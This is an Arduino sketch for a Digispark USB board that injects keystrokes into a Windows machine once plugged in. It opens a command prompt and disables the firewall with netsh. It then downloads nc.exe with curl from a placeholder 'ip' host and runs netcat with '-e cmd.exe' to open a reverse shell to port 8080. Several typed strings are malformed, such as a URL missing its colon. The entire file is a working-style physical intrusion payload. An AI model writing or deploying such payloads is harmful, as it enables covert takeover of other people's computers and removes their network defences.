#define kbd_tr_tr
#include "DigiKeyboard.h"

void setup() {
}

void loop() {
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.delay(750);
DigiKeyboard.print("cmd");
DigiKeyboard.delay(750);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(750);
DigiKeyboard.print("netsh firewall set opmode disable");
DigiKeyboard.delay(750);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(750);
DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT);
DigiKeyboard.delay(750);
DigiKeyboard.print("web");
DigiKeyboard.delay(750);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(750);
DigiKeyboard.sendKeyStroke(KEY_E, MOD_CONTROL_LEFT);
DigiKeyboard.delay(750);
DigiKeyboard.print("ip /nc.exe");
DigiKeyboard.delay(750);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.delay(350);
DigiKeyboard.print("cmd");
DigiKeyboard.delay(750);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(350);
DigiKeyboard.print("curl -o nc.exe http//ip/nc.exe");
DigiKeyboard.delay(750);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(350);
DigiKeyboard.print("nc  ip 8080 -e cmd.exe");
DigiKeyboard.delay(750);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(350);
DigiKeyboard.print("exit");
DigiKeyboard.delay(350);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
    for (;;){}
}
